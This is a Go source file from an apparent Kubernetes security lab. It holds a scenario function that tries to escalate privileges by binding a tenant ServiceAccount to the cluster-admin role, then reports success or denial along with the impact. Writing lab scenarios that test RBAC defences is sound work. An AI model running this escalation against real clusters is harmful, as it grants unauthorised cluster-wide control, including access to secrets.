package scenarios

import (
	"context"
	"fmt"

	"k8s-security-lab/internal/cluster"

	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func RBACAttack() error {

	fmt.Println("[*] Starting RBAC privilege escalation attempt")

	client, err := cluster.GetClient()
	if err != nil {
		return err
	}

	fmt.Println("[*] Target namespace: tenant-a")
	fmt.Println("[*] Target ServiceAccount: tenant-sa")
	fmt.Println("[*] Attempting to bind cluster-admin role")

	binding := &rbacv1.RoleBinding{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "pwn-binding",
			Namespace: "tenant-a",
		},
		Subjects: []rbacv1.Subject{
			{
				Kind:      "ServiceAccount",
				Name:      "tenant-sa",
				Namespace: "tenant-a",
			},
		},
		RoleRef: rbacv1.RoleRef{
			Kind:     "ClusterRole",
			Name:     "cluster-admin",
			APIGroup: "rbac.authorization.k8s.io",
		},
	}

	fmt.Println("[*] Sending RoleBinding creation request")

	_, err = client.RbacV1().
		RoleBindings("tenant-a").
		Create(context.Background(), binding, metav1.CreateOptions{})

	if err != nil {

		fmt.Println("[!] Privilege escalation FAILED")
		fmt.Println("[!] Kubernetes API denied the request")

		fmt.Println("\nEvidence:")
		fmt.Println(err)

		return err
	}

	fmt.Println("[+] Privilege escalation SUCCESS")

	fmt.Println("\nEvidence:")

	fmt.Println("RoleBinding 'pwn-binding' created")
	fmt.Println("ServiceAccount 'tenant-sa' now bound to 'cluster-admin'")

	fmt.Println("\nImpact:")

	fmt.Println("The attacker can now perform cluster-admin actions such as:")
	fmt.Println(" - list secrets across namespaces")
	fmt.Println(" - create privileged workloads")
	fmt.Println(" - modify RBAC policies")

	return nil
}
